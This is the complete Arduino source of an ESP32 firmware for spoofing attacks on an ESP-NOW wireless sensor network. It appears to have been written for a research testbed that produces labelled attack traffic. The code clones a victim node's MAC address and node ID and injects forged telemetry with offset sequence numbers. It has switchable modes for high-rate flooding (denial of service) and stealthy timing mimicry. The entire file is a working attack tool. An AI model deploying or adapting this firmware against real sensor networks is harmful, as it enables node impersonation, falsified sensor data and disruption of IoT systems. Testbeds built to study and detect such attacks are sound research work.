/*
 * ESP32 Multi-Mode WSN Spoofing Attacker Firmware
 * 
 * Hardware: ESP32 NodeMCU / WROOM-32 (Attacker Node A1)
 * Protocol: ESP-NOW (2.4 GHz 802.11 b/g/n)
 * 
 * Attack Capabilities:
 *  1. MAC Address & Node ID Impersonation (spoofing victim node N1)
 *  2. Mode 0: Normal Baseline Transmission (Periodic 100 ms)
 *  3. Mode 1: High-Rate Injection Attack (Burst 10-20 ms DoS)
 *  4. Mode 2: Timing Mimicry Attack (Stealth 100 ms spoofing with phase offset)
 * 
 * Target: Real-World Physical WSN Spoofing Validation
 */

#include <esp_now.h>
#include <WiFi.h>
#include <esp_wifi.h>

// ============================================================================
// SPOOFING CONFIGURATION
// ============================================================================
#define VICTIM_NODE_ID       1             // Target legitimate node to impersonate
#define WIFI_CHANNEL        1             // Wi-Fi channel matching Cluster Head

// MAC Address of Target Victim Node N1 (To be cloned onto Attacker hardware)
uint8_t spoofedMacAddress[] = {0x24, 0x6F, 0x28, 0x11, 0x22, 0x33};

// Receiver (Cluster Head) MAC Address
uint8_t receiverAddress[]   = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}; // Broadcast frame

// Attack Mode Selector:
// 0 = Normal Baseline (Pre-attack monitoring)
// 1 = High-Rate Packet Injection (Flood / Desync Attack)
// 2 = Timing Mimicry Attack (Stealth periodic impersonation)
int attackMode = 1; 

// Packet Payload Structure (Matches Receiver schema)
typedef struct __attribute__((packed)) {
    uint8_t  node_id;       // Impersonated Node ID
    uint32_t seq_num;       // Desynchronized / Spoofed Sequence Number
    uint32_t send_time_us;  // Attacker microsecond clock tick
    float    telemetry_val; // Forged sensor measurement
    uint8_t  flags;         // Ground truth attack tag (1 = spoofed frame)
} TelemetryPacket;

TelemetryPacket attackPacket;
uint32_t attackerSeqNum = 5000; // Offset sequence number to disrupt victim stream
unsigned long lastTxTime = 0;
esp_now_peer_info_t peerInfo;

void setup() {
    Serial.begin(115200);
    delay(1000);

    Serial.println("=================================================");
    Serial.println(" ESP32 Multi-Mode Spoofing Attacker Initialized");
    Serial.printf(" Impersonating Victim Node ID: %d\n", VICTIM_NODE_ID);
    Serial.println("=================================================");

    // Set Wi-Fi Mode to Station
    WiFi.mode(WIFI_STA);

    // ------------------------------------------------------------------------
    // MAC ADDRESS SPOOFING IMPLEMENTATION
    // Overrides hardware MAC address of ESP32 with victim node's MAC address
    // ------------------------------------------------------------------------
    esp_wifi_set_mac(WIFI_IF_STA, spoofedMacAddress);

    // Set Wi-Fi Channel
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(WIFI_CHANNEL, WIFI_SECOND_CHAN_NONE);
    esp_wifi_set_promiscuous(false);

    Serial.print("[ATTACKER] Spoofed MAC Address Configured: ");
    Serial.println(WiFi.macAddress());

    // Initialize ESP-NOW
    if (esp_now_init() != ESP_OK) {
        Serial.println("[ERROR] ESP-NOW Init Failed!");
        return;
    }

    // Register Peer
    memcpy(peerInfo.peer_addr, receiverAddress, 6);
    peerInfo.channel = WIFI_CHANNEL;
    peerInfo.encrypt = false;
    esp_now_add_peer(&peerInfo);
}

void loop() {
    unsigned long currentMillis = millis();
    uint32_t interval = 100; // Default

    // Dynamic Attack Behavior Switch
    switch (attackMode) {
        case 0:
            // Mode 0: Normal Baseline (Periodic 100 ms)
            interval = 100 + random(-3, 4);
            break;

        case 1:
            // Mode 1: High-Rate Injection Attack
            // Transmits aggressive burst packets every 10 to 20 ms
            interval = random(10, 21);
            break;

        case 2:
            // Mode 2: Timing Mimicry Attack
            // Matches victim's nominal interval (100 ms), but injected mid-slot
            // creating inter-arrival jitter and bimodal RSSI distribution
            interval = 100 + random(-10, 11);
            break;
    }

    if (currentMillis - lastTxTime >= interval) {
        lastTxTime = currentMillis;

        // Construct Spoofed Packet
        attackPacket.node_id = VICTIM_NODE_ID; // Impersonates Victim N1
        attackPacket.seq_num = ++attackerSeqNum;
        attackPacket.send_time_us = micros();
        attackPacket.telemetry_val = 99.9;      // Forged / Malicious telemetry value
        attackPacket.flags = 0x01;              // Attack ground-truth label

        // Send Packet
        esp_now_send(receiverAddress, (uint8_t *)&attackPacket, sizeof(attackPacket));

        Serial.printf("[ATTACK TX | Mode %d] NodeID: %d | Seq: %u | Interval: %u ms\n",
                      attackMode, attackPacket.node_id, attackPacket.seq_num, interval);
    }

    // Serial Command Switcher to toggle attack modes on the fly
    if (Serial.available()) {
        char cmd = Serial.read();
        if (cmd == '0') {
            attackMode = 0;
            Serial.println("\n>>> Switched to MODE 0: Normal Baseline");
        } else if (cmd == '1') {
            attackMode = 1;
            Serial.println("\n>>> Switched to MODE 1: High-Rate Injection Attack");
        } else if (cmd == '2') {
            attackMode = 2;
            Serial.println("\n>>> Switched to MODE 2: Timing Mimicry Attack");
        }
    }
}
